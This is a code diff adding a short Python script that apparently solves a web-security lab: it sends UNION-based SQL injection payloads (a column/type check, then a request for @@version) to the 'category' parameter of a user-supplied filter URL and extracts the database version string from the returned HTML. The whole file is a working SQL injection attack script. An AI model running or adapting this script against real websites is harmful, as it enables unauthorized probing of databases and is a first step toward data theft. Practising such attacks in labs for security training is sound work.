@@ -1,0 +1,29 @@
+import requests
+import re
+
+filter_url = input("Enter the category filter URL (ending at /filter): ")
+
+check_payload = "' UNION SELECT 'abc','def'#"
+response = requests.get(filter_url, params={"category": check_payload})
+print("[*] Column/type check response snippet:")
+print(response.text[:300])
+
+version_payload = "' UNION SELECT @@version, NULL#"
+response = requests.get(filter_url, params={"category": version_payload})
+
+html = re.sub(r'<script.*?</script>', '', response.text, flags=re.DOTALL)
+html = re.sub(r'<style.*?</style>', '', html, flags=re.DOTALL)
+text_only = re.sub(r'<[^>]+>', '\n', html)
+clean_lines = [line.strip() for line in text_only.splitlines() if line.strip()]
+
+version_pattern = re.compile(r'\d+\.\d+\.\d+[-\w.]*')
+found = [line for line in clean_lines if version_pattern.search(line)]
+
+if found:
+    print("\n[+] Candidate version line(s) found:")
+    for line in found:
+        print(f"  {line}")
+else:
+    print("\n==> No version string matched. Here are all cleaned lines to check manually:")
+    for line in clean_lines:
+        print(f"  {line}")
